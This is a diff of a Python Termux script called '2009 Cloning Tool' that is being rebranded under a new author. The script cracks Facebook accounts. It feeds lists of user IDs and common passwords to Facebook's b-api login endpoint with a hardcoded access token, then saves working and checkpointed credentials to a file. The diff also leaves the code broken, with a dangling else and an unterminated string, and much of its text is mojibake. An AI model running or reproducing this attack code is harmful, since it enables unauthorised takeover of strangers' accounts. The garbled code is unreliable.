@@ -32,11 +32,11 @@ from concurrent.futures import ThreadPoolExecutor
 def logo():
 	print ("""
    
- ───────────────────────────────────────────────────────×
-  ───────────────────────────────────────────────────────×
-\t\033[1;97m[\x1b[1;97m\x1b[1;41m ღ﹏Ahsam﹏ღ\x1b[0m\x1b[1;97m]
+ ¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¡Ñ
+  ¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¡Ñ
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m ¡H¡\Ahsam¡\¡H\x1b[0m\x1b[1;97m]
 \t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :1\x1b[0m\x1b[1;97m] \033[1;37m 
- ───────────────────────────────────────────────────────×
+ ¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¡Ñ
  """)
 def logo2():
 	#Yahan apna logo paste krna hw
@@ -50,14 +50,14 @@ def logo2():
 \033[1;31m | )   ( || ) \ \__  | )   ( || (___) || )   ( |
 \033[1;33m |/     \||/   \__/  |/     \|(_______)|/     \|  
                                                                    
- ───────────────────────────────────────────────────────×
-\t\033[1;97m[\x1b[1;97m\x1b[1;41m ღ﹏AHSAM﹏ღ\x1b[0m\x1b[1;97m]
+ ¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¡Ñ
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m ¡H¡\AHSAM¡\¡H\x1b[0m\x1b[1;97m]
 \t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :5.0\x1b[0m\x1b[1;97m] \033[1;37m 
- ───────────────────────────────────────────────────────×
-\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : ღ﹏AHSAM﹏ღ \x1b[0m\x1b[1;97m]
-\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : TANVIR-404\x1b[0m\x1b[1;97m]
-\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : 
-───────────────────────────────────────────────────────× 
+ ¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¡Ñ
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : ¡H¡\AHSAM¡\¡H \x1b[0m\x1b[1;97m]
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : https://github.com/MR-AUH404\x1b[0m\x1b[1;97m]
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook./AHSAM JOIYA\x1b[0m\x1b[1;97m]
+¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¡Ñ 
  """)
  
 def runtxt(z):
@@ -71,22 +71,12 @@ os.system('termux-setup-storage')
 def helpnote():
 	print("%s [=>] FOLLOW ME ON  FB TO KNOW ABOUT ME  :)"%(G))
 	#yahan nichy httsp sy hata kr apna github aproval link dalna
-	subprocess.check_output(["am", "start", "ht"])
+	subprocess.check_output(["am", "start", "https://github.com/MR-AUH404/2k9/blame/main/approved.txt"])
 	#yahan apni facebook id link dalna
 	exit(" [=>] FACEBOOK :  https://www.facebook.com/AHSAM.JOIYA")
  
  
-def notice():
- 
- 
- 
-	runtxt("\n\033[0;97m  Free 2009 cloning 1st JOIN MY PAGE  ")
-	os.system("xdg-open https://www.facebook.com/AHSAM.JOIYA")
-	runtxt("\033[0;97m Follow My Fb ACCOUNT   >> %s%s"%(G,basesplit))
-	runtxt("\033[0;97m Send Your Key On My FB ID ")
-	os.system("xdg-open https://www.facebook.com/AHSAM.JOIYA")
-	subprocess.check_output(["am", "start", "https://www.facebook.com/AHSAM.JOIYA"])
-	
+
  
  
         
@@ -107,19 +97,12 @@ class Main:
 		self.loop = 0
 		try:
 			#yahan pr v apna github link dalna aproval wala
-			plr = requests.get('https://github.com/Tanvir404Cyber/2k9-Approval.txt').text
-			if basesplit in plr:
-				key = basesplit
-				stat = ("\033[0;97mPREMIUM")
-				FY = '\033[0;97m'
-				FG = '\033[0;97m'
-				GET = '\r'
+			
+			
 			else:
 				key = ("\033[0;97m -")
 				stat = ("\033[0;97mFREE USER")
-				FY = '\033[0;90m'
-				FG = '\033[0;90m'
-				GET = '\033[0;97m [P] GET PREMIUM'
+				FY = '\033[0;90m
 		except requests.exceptions.ConnectionError:
 			print("\n%s [!] NO INTERNET CONNECTION..\n"%(R))
 			exit()
@@ -134,27 +117,27 @@ class Main:
 \033[1;35m | |   | || (\ (     | (   ) || |   | || (   ) |
 \033[1;31m | )   ( || ) \ \__  | )   ( || (___) || )   ( |
 \033[1;33m |/     \||/   \__/  |/     \|(_______)|/     \|                                                                                                                                                                                                                                                                                                   
- ───────────────────────────────────────────────────────×
-\t\033[1;97m[\x1b[1;97m\x1b[1;41m ღ﹏AHSAM﹏ღ\x1b[0m\x1b[1;97m]
+ ¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¡Ñ
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m ¡H¡\AHSAM¡\¡H\x1b[0m\x1b[1;97m]
 \t\033[1;97m[\x1b[1;97m\x1b[1;41m Version : 5.0\x1b[0m\x1b[1;97m] \033[1;37m 
- ───────────────────────────────────────────────────────×
-\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : ღ﹏𝐀HSAM﹏ღ \x1b[0m\x1b[1;97m]
+ ¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¡Ñ
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : ¡H¡\¡HHSAM¡\¡H \x1b[0m\x1b[1;97m]
 \t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : https://github.com/MR-AUH404 \x1b[0m\x1b[1;97m]
-\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : AHSAM UL HAQ 🥰 \x1b[0m\x1b[1;97m]
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : AHSAM UL HAQ ¡H \x1b[0m\x1b[1;97m]
 \t\033[1;97m[\x1b[1;97m\x1b[1;41m Page : https://www.facebook.com/AHSAM.JOIYA\x1b[0m\x1b[1;97m]
-───────────────────────────────────────────────────────× 
+¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¡Ñ 
     """)
-		print("%s [%s•%s] %sTOOL NAME : %s2009 Cloning Tool"%(G,R,G,B,G))
-		print("%s [%s•%s] %sVERSION   : %s5.0"%(G,R,G,B,G))
-		print("%s [%s•%s] %sYOUR KEY  : %s%s"%(G,R,G,B,G,key))
-		print("%s [%s•%s] %sSTATUS    : %s"%(G,R,G,B,stat)) 
-		print("───────────────────────────────────────────────────────× ")
+		print("%s [%s¡H%s] %sTOOL NAME : %s2009 Cloning Tool"%(G,R,G,B,G))
+		print("%s [%s¡H%s] %sVERSION   : %s5.0"%(G,R,G,B,G))
+		print("%s [%s¡H%s] %sYOUR KEY  : %s%s"%(G,R,G,B,G,key))
+		print("%s [%s¡H%s] %sSTATUS    : %s"%(G,R,G,B,stat)) 
+		print("¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¡Ñ ")
 		print(" \t\033[1;97m[\x1b[1;97m\x1b[1;41m FOLLOW MY FB PAGE  \x1b[0m\x1b[1;97m] \033[1;37m ")
 		subprocess.check_output(["am", "start", "https://www.facebook.com/AHSAM.JOIYA"])
-		print("───────────────────────────────────────────────────────× ")
+		print("¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¡Ñ ")
 		print("%s [%s1%s]%s CRACK RANDOM FB ID 2009-11 {JUST NOW} %s(ENJOY)"%(G,R,G,Y,B))
-		tanya = input("    \033[0;97m(=×>)\033[0;97m CHOOSE : ")
-		print("───────────────────────────────────────────────────────× ")
+		tanya = input("    \033[0;97m(=¡Ñ>)\033[0;97m CHOOSE : ")
+		print("¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¡Ñ ")
 		if tanya in ["", " "]:
 			Main()
 		elif tanya in ["1", "01"]:
@@ -184,18 +167,18 @@ class Main:
 				print("\n%s [=>] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
 				print("%s EXAMPLE : %s123456,123456789"%(Y,G))
 				listpass = input("%s [=>] TYPE (123456,123456789) :%s "%(Y,G))
-				print("───────────────────────────────────────────────────────× ")
+				print("¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¡Ñ ")
 				if len(listpass)<=5:
 					exit("\n%s [=>] PASSWORD MINIMUM 6 CHARACTERS"%(R))
 				print("%s [=>] CRACK WITH PASSWORD -> [\033[0;97m%s\033[0;97m]"%(Y,listpass))
 				os.system("clear")
 				logo2()
-				print("───────────────────────────────────────────────────────× ")
-				print("\033[0;92m[=×>]\033[0;92m NOTE : BEFORE LOGIN CP IDZ ")
-				print("\033[0;92m[=×>]\033[0;92m NOTE : CLEAR YOUR FACEBOOK /BROWSER DATA " )
-				print("\033[0;92m[=×>]\033[0;92m NOTE : ENJOY TOOL")
-				print("\033[0;92m[=×>]\033[0;92m NOTE : 𝗜𝗙 𝗡𝗢 𝗥𝗘𝗦𝗨𝗟𝗧𝗦 𝗨𝗦𝗘 𝗔𝗜𝗥𝗢𝗣𝗟𝗔𝗡𝗘 𝗠𝗢𝗗𝗘 𝗙𝗢𝗥 10 𝗦𝗘𝗖𝗦 ")
-				print("\033[0;97m───────────────────────────────────────────────────────× ")
+				print("¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¡Ñ ")
+				print("\033[0;92m[=¡Ñ>]\033[0;92m NOTE : BEFORE LOGIN CP IDZ ")
+				print("\033[0;92m[=¡Ñ>]\033[0;92m NOTE : CLEAR YOUR FACEBOOK /BROWSER DATA " )
+				print("\033[0;92m[=¡Ñ>]\033[0;92m NOTE : ENJOY TOOL")
+				print("\033[0;92m[=¡Ñ>]\033[0;92m NOTE : ¡H¡H ¡H¡H ¡H¡H¡H¡H¡H¡H¡H ¡H¡H¡H ¡H¡H¡H¡H¡H¡H¡H¡H¡H ¡H¡H¡H¡H ¡H¡H¡H 10 ¡H¡H¡H¡H ")
+				print("\033[0;97m¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¢w¡Ñ ")
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
 			exit("\n\n    [=>] CRACK COMPLETE...\n\033[0;92m >>[THANKS FOR USING MY TOOL...")
@@ -363,7 +346,7 @@ class Main:
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
 			])
 		sys.stdout.write(
-			"\r [+]%s> /[AHSAM 😍]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [+]%s> /[AHSAM ¡H]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -378,17 +361,17 @@ class Main:
 				"content-type": "application/x-www-form-urlencoded", 
 				"x-fb-http-engine": "Liger"
 			}
-			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
+			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¡Htly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-ღ﹏AUH﹏ღ]%s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[¡H¡H¡H¡H¡H¡H¡H¡H¡H¡H¡H-¡H¡\AUH¡\¡H]%s | %s\033[1;32m         "%(uid, pw))
 				print ("\r \033[1;32m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-ღ﹏AUH﹏ღ.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("¡H¡H¡H¡H¡H¡H¡H¡H¡H¡H¡H-¡H¡\AUH¡\¡H.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-ღ﹏AUH﹏ღ] %s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[¡H¡H¡H¡H¡H¡H¡H¡H¡H¡H¡H-¡H¡\AUH¡\¡H] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-ღ﹏AUH﹏ღ.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("¡H¡H¡H¡H¡H¡H¡H¡H¡H¡H¡H-¡H¡\AUH¡\¡H.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -406,7 +389,7 @@ if len(sys.argv) == 2:
 		print(" [*] Facebook  : https://facebook.com/AHSAM.JOIYA")
 		print(" [*] Instagram : https://instagram.com/ ")
 		print(" [*] YouTube   : https://youtube.com/@ahsamkitrikes ")
-		exit(" [*] GitHub    : https://github.com/Tanvir404Cyber")
+		exit(" [*] GitHub    : https://github.com/MR-AUH404")
 	else:
 		Main()
  
